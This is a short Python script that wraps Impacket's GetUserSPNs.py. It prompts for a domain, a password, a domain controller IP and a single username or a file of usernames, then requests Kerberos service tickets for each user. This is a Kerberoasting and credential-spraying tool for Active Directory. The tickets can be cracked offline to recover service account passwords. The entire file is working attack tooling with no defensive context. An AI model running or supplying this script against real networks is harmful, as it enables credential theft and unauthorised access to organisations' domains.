import os
import subprocess
import sys

domain = input("Domain: ").strip()
if not domain:
    print("Domain required.")
    sys.exit(1)

user_or_file = input("Username (or path to users file): ").strip()
if not user_or_file:
    print("Username or file required.")
    sys.exit(1)

password = input("Password: ").strip()
if not password:
    print("Password is required.")
    sys.exit(1)

dc_ip = input("DC IP: ").strip()
if not dc_ip:
    print("DC IP required.")
    sys.exit(1)

def run(user):
    cmd = ["GetUserSPNs.py", f"{domain}/{user}:{password}", "-dc-ip", dc_ip, "-request"]
    print(f"Testing {user}")
    subprocess.run(cmd)

if os.path.isfile(user_or_file):
    with open(user_or_file, "r", encoding="utf-8") as f:
        for line in f:
            u = line.strip()
            if not u or u.startswith("#"):
                continue
            run(u)
else:
    run(user_or_file)
